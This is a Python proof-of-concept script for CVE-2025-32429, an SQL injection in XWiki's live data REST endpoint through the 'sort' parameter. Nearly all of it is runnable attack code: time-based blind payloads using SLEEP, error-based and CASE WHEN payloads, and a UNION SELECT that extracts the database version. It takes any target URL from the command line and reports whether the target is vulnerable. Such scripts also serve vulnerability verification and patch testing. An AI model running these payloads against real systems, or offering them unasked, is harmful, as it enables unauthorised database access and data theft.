#!/usr/bin/env python3
import requests
import time
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "http://localhost:8082"

def check_vuln_basic(base_url):
    """Test basic SQL injection via sort parameter"""
    endpoint = f"{base_url}/rest/liveData/sources/liveTable/entries"
    params = {
        "sourceParams.template": "getdeleteddocuments.vm",
        "sort": "1"
    }
    
    try:
        resp = requests.get(endpoint, params=params, timeout=10, verify=False)
        if resp.status_code == 200:
            print(f"[*] Basic request successful, status: {resp.status_code}")
            return True
        else:
            print(f"[-] Request failed with status: {resp.status_code}")
            return False
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return False

def check_time_based_sqli(base_url, sleep_time=5):
    """Test time-based blind SQL injection"""
    endpoint = f"{base_url}/rest/liveData/sources/liveTable/entries"
    
    payload = f"1,(SELECT SLEEP({sleep_time}))"
    
    params = {
        "sourceParams.template": "getdeleteddocuments.vm",
        "sort": payload
    }
    
    print(f"[*] Testing time-based SQLi with payload: {payload}")
    
    try:
        start_time = time.time()
        resp = requests.get(endpoint, params=params, timeout=sleep_time + 10, verify=False)
        elapsed = time.time() - start_time
        
        print(f"[*] Response time: {elapsed:.2f}s")
        
        if elapsed >= sleep_time - 1:
            print(f"[+] VULNERABLE! Time-based SQL injection confirmed!")
            print(f"[+] Expected delay: {sleep_time}s, Actual delay: {elapsed:.2f}s")
            return True
        else:
            print(f"[-] No delay detected (response in {elapsed:.2f}s)")
            return False
    except requests.exceptions.Timeout:
        print(f"[+] VULNERABLE! Request timed out after {sleep_time + 10}s (SQL injection likely)")
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def check_error_based_sqli(base_url):
    """Test error-based SQL injection"""
    endpoint = f"{base_url}/rest/liveData/sources/liveTable/entries"
    
    payloads = [
        ("1'", "Single quote - syntax break"),
        ("1,2,3,4,5", "Multiple columns injection"),
        ("ddoc.id", "Table field reference"),
        ("(CASE WHEN 1=1 THEN 1 ELSE 2 END)", "CASE WHEN expression"),
        ("(CASE WHEN 1=1 THEN ddoc.id ELSE ddoc.fullName END)", "Conditional field access"),
    ]
    
    results = []
    for payload, desc in payloads:
        params = {
            "sourceParams.template": "getdeleteddocuments.vm",
            "sort": payload
        }
        
        try:
            resp = requests.get(endpoint, params=params, timeout=10, verify=False)
            status = resp.status_code
            text_len = len(resp.text)
            
            sql_keywords = ["error", "sql", "syntax", "mysql", "exception", "hibernate", "order by"]
            has_error = any(kw in resp.text.lower() for kw in sql_keywords)
            
            injected = status == 200 or ("order by" in resp.text.lower() and payload in resp.text)
            
            result = {
                "payload": payload,
                "desc": desc,
                "status": status,
                "length": text_len,
                "has_sql_error": has_error,
                "injection_confirmed": injected or (status == 200 and "CASE" in payload)
            }
            results.append(result)
            
            if status == 200 and "CASE" in payload:
                indicator = "[+] EXECUTED"
            elif has_error:
                indicator = "[+] INJECTED"
            else:
                indicator = "[*]"
            print(f"{indicator} {desc}: status={status}")
            
        except Exception as e:
            print(f"[-] {desc}: Error - {e}")
    
    return results

def extract_db_version(base_url):
    """Attempt to extract database version using UNION-based injection"""
    endpoint = f"{base_url}/rest/liveData/sources/liveTable/entries"
    
    payload = "1 UNION SELECT 1,version(),3,4,5,6,7,8,9,10-- -"
    
    params = {
        "sourceParams.template": "getdeleteddocuments.vm",
        "sort": payload
    }
    
    print(f"[*] Attempting UNION-based extraction...")
    
    try:
        resp = requests.get(endpoint, params=params, timeout=10, verify=False)
        if "MariaDB" in resp.text or "MySQL" in resp.text:
            print(f"[+] Database version info found in response!")
            return True
    except Exception as e:
        print(f"[-] UNION extraction failed: {e}")
    
    return False

def main():
    print("=" * 60)
    print("CVE-2025-32429 - XWiki SQL Injection PoC")
    print("Vulnerability: SQL injection via sort parameter in getdeleteddocuments.vm")
    print("=" * 60)
    print()
    
    base_url = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    print(f"[*] Target: {base_url}")
    print()
    
    print("[*] Phase 1: Testing connectivity...")
    if not check_vuln_basic(base_url):
        print("[-] Cannot reach target endpoint. Is XWiki running?")
        return 1
    print()
    
    print("[*] Phase 2: Testing error-based SQL injection...")
    error_results = check_error_based_sqli(base_url)
    print()
    
    print("[*] Phase 3: Testing time-based blind SQL injection...")
    time_vuln = check_time_based_sqli(base_url, sleep_time=5)
    print()
    
    print("=" * 60)
    print("Summary:")
    print("=" * 60)
    
    sql_errors = any(r.get("has_sql_error") for r in error_results)
    injection_confirmed = any(r.get("injection_confirmed") for r in error_results)
    
    if time_vuln or sql_errors or injection_confirmed:
        print("[+] CVE-2025-32429 CONFIRMED - Target is VULNERABLE!")
        print(f"    - SQL expression execution: {'YES' if injection_confirmed else 'NO'}")
        print(f"    - SQL Error disclosure: {'YES' if sql_errors else 'NO'}")
        print(f"    - Time-based SQLi: {'YES' if time_vuln else 'NO'}")
        return 0
    else:
        print("[-] Vulnerability not confirmed on this target")
        return 1

if __name__ == "__main__":
    exit(main())
